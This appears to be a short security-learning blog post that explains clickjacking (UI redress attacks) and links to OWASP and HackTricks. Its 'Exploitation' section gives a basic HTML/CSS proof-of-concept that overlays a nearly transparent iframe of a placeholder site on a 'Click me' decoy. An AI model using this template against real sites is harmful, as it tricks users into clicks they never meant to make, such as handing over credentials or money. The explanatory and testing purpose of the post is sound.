---
title: Clickjacking (UI redressing)
#author: cotes
date: 2024-11-21 12:00:00 +04:00
categories: [Web Vulnerabilities,Clickjacking]
tags: [Web Vulnerabilities]
render_with_liquid: false
image:
  path: /images/web_vulnerabilities/clickjacking/clickjacking.png
  alt: Clickjacking
---

## What is Clickjacking?

Clickjacking, also known as a “UI redress attack," unintentionally clicks on an invisible button placed over the visible web page user interface. This is possible when the invisible button is present in the iframe layer which is essentially superimposed over the actual page.

So, when a user clicks on some area thinking of performing a particular action, they are actually performing some other action.

This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online.

## Exploitation

**Basic Payload**

<pre>
<style>
  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 470px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://publish.hoax.com/"></iframe>
</pre>






## References

[**OWASP**](https://owasp.org/www-community/attacks/Clickjacking)

[**Hacktricks**](https://book.hacktricks.xyz/pentesting-web/clickjacking)

